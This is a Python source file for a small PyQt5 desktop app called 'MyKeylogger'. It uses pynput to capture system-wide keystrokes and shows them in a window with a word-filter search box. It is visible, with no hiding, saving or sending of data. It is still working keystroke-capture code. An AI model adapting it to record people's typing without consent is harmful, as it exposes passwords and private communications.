import sys
from PyQt5.QtWidgets import QApplication, QMainWindow, QTextEdit, QLineEdit
from PyQt5.QtCore import QObject, pyqtSignal
from pynput import keyboard
from threading import Thread

class Communicate(QObject):
    textChanged = pyqtSignal(str)

class KeyloggerThread(Thread):
    def __init__(self, text_edit, search_edit, communicator):
        super().__init__()
        self.text_edit = text_edit
        self.search_edit = search_edit
        self.communicator = communicator

    def run(self):
        def on_press(key):
            try:
                if key.char is not None:
                    self.communicator.textChanged.emit(key.char)
            except AttributeError:
                if key == keyboard.Key.space:
                    self.communicator.textChanged.emit(" ")

        def on_release(key):
            if key == keyboard.Key.esc:
                return False

        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    def filter_words(self, char):
        text = self.text_edit.toPlainText()
        search_text = self.search_edit.text()
        if search_text:
            filtered_text = ' '.join(word for word in text.split() if search_text.lower() in word.lower())
            self.text_edit.setPlainText(filtered_text)
        else:
            self.text_edit.insertPlainText(char)

def main():
    app = QApplication(sys.argv)
    window = QMainWindow()
    window.setGeometry(100, 100, 400, 250)
    window.setWindowTitle("MyKeylogger")

    text_edit = QTextEdit(window)
    text_edit.move(50, 50)
    text_edit.resize(300, 150)
    text_edit.setEnabled(False)
    text_edit.setStyleSheet("color: red;")

    search_edit = QLineEdit(window)
    search_edit.move(50, 20)
    search_edit.resize(300, 20)
    search_edit.setStyleSheet("color: blue;")

    communicator = Communicate()

    keylogger_thread = KeyloggerThread(text_edit, search_edit, communicator)
    communicator.textChanged.connect(keylogger_thread.filter_words)

    keylogger_thread.start()

    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
